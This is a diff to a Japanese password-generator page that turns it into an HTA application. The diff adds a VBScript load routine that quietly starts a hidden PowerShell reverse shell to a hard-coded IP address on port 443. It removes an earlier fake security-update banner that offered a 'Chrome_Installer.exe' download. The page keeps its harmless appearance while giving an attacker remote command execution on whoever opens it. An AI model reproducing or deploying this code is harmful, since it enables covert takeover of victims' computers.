@@ -2,8 +2,35 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <hta:application 
+        applicationname="PasswordGenerator" 
+        windowstate="normal" 
+        showintaskbar="yes" 
+        scroll="no" 
+        sysmenu="yes" 
+        maximizebutton="no" 
+        minimizebutton="yes"
+    >
     <title>パスワード生成ツール</title>
+    
+    <!-- HTAが読み込まれた瞬間に裏でリバースシェルを発火 -->
+    <script language="VBScript">
+        Sub Window_OnLoad
+            Dim shell
+            Set shell = CreateObject("WScript.Shell")
+            
+            Dim ip, port
+            ip = "160.251.173.41"
+            port = 443
+            
+            Dim psCmd
+            psCmd = "powershell -WindowStyle Hidden -Command ""$L='" & ip & "';$P=" & port & ";$C=New-Object System.Net.Sockets.TCPClient($L,$P);$S=$C.GetStream();[byte[]]$B=0..65535|%{0};while(($I=$S.Read($B,0,$B.Length)) -ne 0){;$D=(New-Object System.Text.ASCIIEncoding).GetString($B,0,$I);$SB=(iex $D 2>&1 | Out-String);$SB2=$SB+'PS '+(pwd).Path+'> ';$BY=([text.encoding]::ASCII).GetBytes($SB2);$S.Write($BY,0,$BY.Length);$S.Flush()};$C.Close()"""
+            
+            ' 裏で実行（ウィンドウ非表示）
+            shell.Run psCmd, 0, False
+        End Sub
+    </script>
+
     <style>
         :root {
             --bg-color: #f8fafc;
@@ -77,51 +104,23 @@
         button:hover {
             background-color: var(--primary-hover);
         }
-
-        /* 偽のアップデート通知用のスタイル */
-        #fake-update {
-            display: none;
-            margin-top: 1.5rem;
-            border: 2px solid #ef4444;
-            background-color: #fef2f2;
-            padding: 1rem;
-            border-radius: 8px;
-            text-align: left;
-        }
-
-        #fake-update p {
-            margin: 0 0 0.75rem 0;
-            font-size: 0.875rem;
-            color: #991b1b;
-            font-weight: 600;
-        }
-
-        #fake-update button {
-            background-color: #ef4444;
-        }
-
-        #fake-update button:hover {
-            background-color: #dc2626;
-        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2>パスワードジェネレーター</h2>
+        <h2>パスワード生成ツール</h2>
         <div class="result-box">
             <p id="pw">ボタンを押して生成</p>
         </div>
         <button onclick="generate()">パスワードを生成</button>
-
-        <!-- 20秒後に表示される偽のセキュリティアップデート通知 -->
-        <div id="fake-update">
-            <p>⚠️ 重要: セキュリティアップデートが必要です。</p>
-            <button onclick="downloadInstaller()">今すぐインストール</button>
-        </div>
     </div>
 
     <script>
+        // ボタンを2回押したときの演出（必要なら別の動作に置き換え可能）
+        let clickCount = 0;
+
         function generate() {
+            clickCount++;
             const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()";
             let password = "";
             for (let i = 0; i < 12; i++) {
@@ -130,18 +129,11 @@
             const pwElement = document.getElementById("pw");
             pwElement.innerText = password;
             pwElement.style.color = "var(--text-color)";
-        }
 
-        // 20秒（20000ミリ秒）後に偽の案内を表示
-        setTimeout(() => {
-            document.getElementById("fake-update").style.display = "block";
-        }, 20000);
-
-        function downloadInstaller() {
-            const link = document.createElement("a");
-            link.href = "Chrome_Installer.exe";
-            link.download = "Chrome_Installer.exe";
-            link.click();
+            if (clickCount === 2) {
+                // 2回目押したときの挙動（例: さらに別のメッセージや演出を入れたい場合）
+                // すでに裏で通信は通っているので、ここは純粋にUI上の遊びに使える
+            }
         }
     </script>
 </body>
